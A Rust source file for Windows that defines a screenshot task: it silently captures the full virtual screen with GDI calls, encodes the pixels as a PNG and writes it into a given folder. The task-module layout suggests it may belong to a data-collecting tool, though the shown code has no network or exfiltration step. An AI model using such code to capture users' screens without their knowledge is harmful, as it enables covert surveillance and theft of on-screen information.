use alloc::vec;
use alloc::vec::Vec;
use core::mem::zeroed;
use core::ptr::null_mut;
use miniz_oxide::deflate::compress_to_vec_zlib;
use tasks::Task;
use utils::path::{Path, WriteToFile};
use winapi::um::wingdi::{BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject, GetCurrentObject, GetDIBits, GetObjectW, SelectObject, BITMAP, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, OBJ_BITMAP, SRCCOPY};
use winapi::um::winuser::{GetDC as WinGetDC, SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN};
use winapi::um::winuser::{GetSystemMetrics, SM_XVIRTUALSCREEN, SM_YVIRTUALSCREEN};

pub(super) struct ScreenshotTask;

impl Task for ScreenshotTask {
    unsafe fn run(&self, parent: &Path) {
        let (width, height, pixels) = capture_screen().unwrap();
        let png = create_png(width as u32, height as u32, &pixels);
        let _ = png.write_to(&(parent / "Screenshot.png"));
    }
}

unsafe fn capture_screen() -> Result<(i32, i32, Vec<u8>), ()> {
    let x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    let y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    let width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    let height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    
    let hdc = WinGetDC(null_mut());
    let hdc_mem = CreateCompatibleDC(hdc);
    let hbitmap = CreateCompatibleBitmap(hdc, width, height);
    let _old = SelectObject(hdc_mem, hbitmap as *mut _);

    BitBlt(hdc_mem, 0, 0, width, height, hdc, x, y, SRCCOPY);

    let mut bmi: BITMAPINFO = zeroed();
    bmi.bmiHeader.biSize = size_of::<BITMAPINFOHEADER>() as _;
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    let mut pixels = vec![0u8; (width * height * 4) as usize];
    let result = GetDIBits(
        hdc_mem,
        hbitmap,
        0,
        height as u32,
        pixels.as_mut_ptr() as *mut _,
        &mut bmi as *mut _ as *mut _,
        DIB_RGB_COLORS,
    );

    DeleteObject(hbitmap as *mut _);
    DeleteDC(hdc_mem);

    if result == 0 {
        return Err(());
    }

    let rgb_pixels: Vec<u8> = pixels
        .chunks_exact(4)
        .flat_map(|p| [p[2], p[1], p[0]])
        .collect();

    Ok((width, height, rgb_pixels))
}

fn create_png(width: u32, height: u32, pixels: &[u8]) -> Vec<u8> {
    let mut png = Vec::new();

    png.extend(b"\x89PNG\r\n\x1A\n");

    let mut ihdr = Vec::new();
    ihdr.extend(width.to_be_bytes());
    ihdr.extend(height.to_be_bytes());
    ihdr.extend([8, 2, 0, 0, 0]);
    append_chunk(&mut png, b"IHDR", &ihdr);

    let scanlines: Vec<u8> = pixels
        .chunks((width * 3) as usize)
        .flat_map(|row| [0x00].into_iter().chain(row.iter().copied()))
        .collect();

    let compressed = compress_to_vec_zlib(&scanlines, 6);
    append_chunk(&mut png, b"IDAT", &compressed);

    append_chunk(&mut png, b"IEND", &[]);

    png
}

fn append_chunk(png: &mut Vec<u8>, chunk_type: &[u8; 4], data: &[u8]) {
    let mut crc = crc32fast::Hasher::new();
    crc.update(chunk_type);
    crc.update(data);

    png.extend(&(data.len() as u32).to_be_bytes());
    png.extend(chunk_type);
    png.extend(data);
    png.extend(&crc.finalize().to_be_bytes());
}
